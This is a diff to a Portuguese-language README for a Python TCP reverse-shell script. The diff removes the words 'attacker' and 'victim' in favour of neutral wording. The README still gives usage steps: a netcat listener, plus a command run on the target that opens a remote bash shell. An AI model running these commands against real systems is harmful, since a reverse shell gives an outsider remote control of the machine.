@@ -1,7 +1,6 @@
 # Reverse Shell TCP
 
-Este projeto contém um script Python para criar uma reverse shell via TCP, permitindo que um atacante obtenha acesso remoto a um sistema alvo.
-
+Este projeto contém um script Python para criar uma reverse shell via TCP.
 ## Arquivo
 - `reverse-shell.py`: Script principal que implementa a reverse shell.
 
@@ -9,7 +8,7 @@ Este projeto contém um script Python para criar uma reverse shell via TCP, perm
 O script conecta-se a um servidor remoto (listener) especificado por IP e porta, redirecionando a entrada e saída padrão para o socket, e executa um shell Bash. Isso permite que o servidor remoto execute comandos no sistema onde o script está rodando.
 
 ## Uso
-1. **No servidor atacante (listener):**
+1. **No servidor listener:**
    Execute um listener na porta desejada, por exemplo usando netcat:
    ```bash
    nc -lvnp <porta>
@@ -20,15 +19,15 @@ O script conecta-se a um servidor remoto (listener) especificado por IP e porta,
    ```bash
    python3 reverse-shell.py <ip_do_servidor> <porta>
    ```
-   - `<ip_do_servidor>`: IP do atacante/listener
+   - `<ip_do_servidor>`: IP do listener
    - `<porta>`: Porta usada pelo listener
 
 ## Exemplo
 ```bash
-# No atacante
+# No listener
 nc -lvnp 4444
 
-# Na vítima
+# Na alvo
 python3 reverse-shell.py 192.168.0.100 4444
 ```
 
